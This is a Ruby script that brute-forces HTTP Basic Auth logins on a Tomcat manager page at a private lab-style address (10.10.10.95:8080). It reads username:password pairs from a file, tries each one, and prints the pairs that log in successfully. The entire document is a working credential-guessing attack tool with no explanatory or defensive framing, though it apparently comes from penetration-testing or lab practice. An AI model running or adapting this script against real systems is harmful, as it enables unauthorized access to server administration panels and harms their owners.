#!/usr/bin/env ruby

require 'net/http'
require 'uri'
require 'base64'

# Target URL 
target_url = "http://10.10.10.95:8080/manager/html"
uri = URI.parse(target_url)

# File containing credentials

creds_file = "creds.txt"

# Check if file exists
unless File.exist?(creds_file)
  puts "[!] Credentials file '#{creds_file}' not found!"
  exit
end

# Read credentials from file
credentials = File.readlines(creds_file, chomp: true).map { |line| line.split(":",2) }

puts "[+] Loaded #{credentials.length} credential pairs from '#{creds_file}'"
puts "[+] Trying credentials agsint #{target_url}..."

# Iterate over each username:password pair
credentials.each do |username, password|
  #Set up HTTP request
  http = Net::HTTP.new(uri.host, uri.port)
  request = Net::HTTP::Get.new(uri.request_uri)

  #Encode credentials for Basic Auth
  auth = Base64.strict_encode64("#{username}:#{password}")
  request["Authorization"] = "Basic #{auth}"

  begin
    # Send the request
    response = http.request(request)

    # Check response code
    case response.code
    when "200"
      puts "[SUCCESS] #{username}:#{password} - Logged in successfully!"
    when "401"
      puts "[FAIL] #{username}:#{password} - Unauthorized"
    else
      puts "[?] #{username}:#{password} - Unexpected response: #{response.code}"
    end
  rescue StandardError => e
    puts "[ERROR] #{username}:#{password} - Failed to connect: #{e.message}"
  end
  sleep(0.5)
end

puts "[+] Done!"
